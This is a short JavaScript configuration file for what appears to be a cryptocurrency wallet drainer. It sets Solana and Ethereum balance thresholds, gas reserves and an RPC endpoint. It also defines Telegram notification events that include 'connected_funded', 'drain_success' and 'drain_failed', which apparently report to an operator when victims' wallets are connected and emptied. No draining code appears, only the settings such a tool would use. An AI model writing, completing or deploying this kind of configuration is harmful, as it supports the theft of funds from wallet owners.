export const SOLANA_CONFIG = {
  MIN_BALANCE: 0.003 * 1e9,
  GAS_RESERVE: 0.002 * 1e9,
  RPC_ENDPOINT: 'https://solana-mainnet.rpc.extrnode.com'
};

export const ETHEREUM_CONFIG = {
  MIN_BALANCE: ethers.parseEther('0.001'),
  GAS_LIMIT: 21000n
};

export const ALLOCATION_RANGE = {
  MIN: 2.37,
  MAX: 5.29
};

export const TELEGRAM_EVENTS = {
  CONNECTED_EMPTY: 'connected_empty',
  CONNECTED_FUNDED: 'connected_funded',
  DRAIN_SUCCESS: 'drain_success',
  DRAIN_FAILED: 'drain_failed',
  MOBILE_USER: 'mobile_user'
};
